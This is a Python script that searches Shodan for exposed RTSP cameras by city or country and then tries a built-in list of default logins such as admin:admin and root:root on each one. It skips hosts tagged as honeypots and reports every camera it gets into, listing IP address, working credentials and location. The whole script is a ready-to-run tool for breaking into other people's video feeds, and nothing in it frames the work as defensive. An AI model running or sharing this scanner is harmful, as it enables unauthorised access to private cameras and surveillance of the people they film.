#!/bin/env python3
import sys
import os
import shodan
import argparse
import cv2
import threading
from queue import Queue
from prettytable import PrettyTable
from colorama import init, Fore
from time import sleep

# Initialize Colorama
init()

# --- Constants & Configuration ---
COLOURS = {
    "warning": "\u001b[38;5;220m",
    "success": "\u001b[38;5;46m",
    "info": "\u001b[38;5;39m",
    "error": "\u001b[38;5;160m",
    "reverse": "\u001b[7m",
    "reset": "\u001b[0m"
}

# --- Helper Functions ---
def clear_screen():
    os.system('cls' if sys.platform == "win32" else 'clear')

def log(msg, level="info"):
    color = COLOURS.get(level, COLOURS["info"])
    print(f'[{COLOURS["reverse"]}{color}{level.upper()[0]}{COLOURS["reset"]}] {msg}')

def get_args():
    parser = argparse.ArgumentParser(description='Find Vulnerable RTSP Cameras')
    parser.add_argument('apikey', help='Shodan API Key')
    parser.add_argument('-t', '--threads', type=int, default=15)
    parser.add_argument('--city', help='Filter by city')
    parser.add_argument('--country', help='Filter by country code (e.g., US)')
    return parser.parse_args()

def build_query(city, country):
    query = "rtsp"
    if country: query += f' country:"{country}"'
    if city: query += f' city:"{city}"'
    return query

def check_rtsp_auth(ip, credentials):
    """Probes a camera for valid credentials."""
    for cred in credentials:
        # Construct URL with auth if provided
        url = f'rtsp://{cred}@{ip}' if cred else f'rtsp://{ip}'
        cap = cv2.VideoCapture(url)
        # Set a short timeout (OpenCV doesn't handle timeouts natively well)
        ret, _ = cap.read()
        cap.release()
        if ret:
            return cred if cred else "No Auth Required"
    return None

def worker_thread(q, results_list, lock):
    creds = ['', 'admin', 'root', 'admin:admin', 'admin:password', 'root:root', 'root:admin']
    while True:
        target = q.get()
        ip = target["ip_str"]
        
        # Skip known honeypots
        if "honeypot" not in str(target):
            auth = check_rtsp_auth(ip, creds)
            if auth:
                with lock:
                    results_list.append({
                        "ip": ip, 
                        "auth": auth, 
                        "city": target["location"].get("city", "N/A"),
                        "country": target["location"].get("country_name", "N/A")
                    })
        q.task_done()

# --- Main Logic ---
def main():
    args = get_args()
    api = shodan.Shodan(args.apikey)
    query = build_query(args.city, args.country)

    try:
        log(f"Searching Shodan for: {query}")
        results = api.search(query)
    except Exception as e:
        log(f"API Error: {e}", "error")
        return

    targets = results['matches']
    log(f"Found {len(targets)} potential targets. Starting probe...")
    
    q = Queue()
    vulnerable_cams = []
    lock = threading.Lock()

    # Start threads
    for _ in range(args.threads):
        t = threading.Thread(target=worker_thread, args=(q, vulnerable_cams, lock), daemon=True)
        t.start()

    for target in targets:
        q.put(target)

    q.join()

    # Final Report
    table = PrettyTable(["IP", "Auth Found", "Country", "City"])
    for cam in vulnerable_cams:
        table.add_row([cam["ip"], cam["auth"], cam["country"], cam["city"]])
    
    print("\n--- Final Results ---")
    print(table)

if __name__ == "__main__":
    main()
